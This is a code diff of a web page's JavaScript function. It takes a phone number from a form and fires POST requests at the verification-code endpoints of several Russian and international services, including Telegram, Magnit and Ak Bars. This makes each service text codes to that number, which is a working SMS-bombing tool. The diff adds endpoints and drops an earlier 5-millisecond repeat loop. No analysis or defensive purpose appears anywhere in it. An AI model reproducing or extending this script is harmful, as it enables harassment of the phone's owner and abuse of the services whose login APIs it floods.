@@ -29,8 +29,10 @@ phoneVP()
 function phoneVP() {
 	var email = document.getElementById("phone").value;
 	$.ajax({type: "POST", url: "https://my.telegram.org/auth/send_password?phone=+7"+email})//1
-	$.ajax({type: "POST", url: "https://api.farfor.ru/v3/842b03f5-7db9-4850-9cb1-407f894abf5e/ufa/auth/request_code/?phone=7"+email+"&ui_element=login"})//1
-	setInterval(phoneVP, 5)
+	$.ajax({type: "POST", url: "https://api.farfor.ru/v3/842b03f5-7db9-4850-9cb1-407f894abf5e/ufa/auth/request_code/?phone=7"+email+"&ui_element=login"})//2
+	$.ajax({type: "POST", url: "https://new.moy.magnit.ru/local/ajax/login/?phone=7"+email+"&ksid=ee191257-a4fe-4e39-9f0f-079c7f721eee_0"})//3
+	$.ajax({type: "POST", url: "https://www.akbars.ru/api/PhoneConfirm/?phoneNumber=7"+email})//4
+	
 }
 	</script>
 				</body>
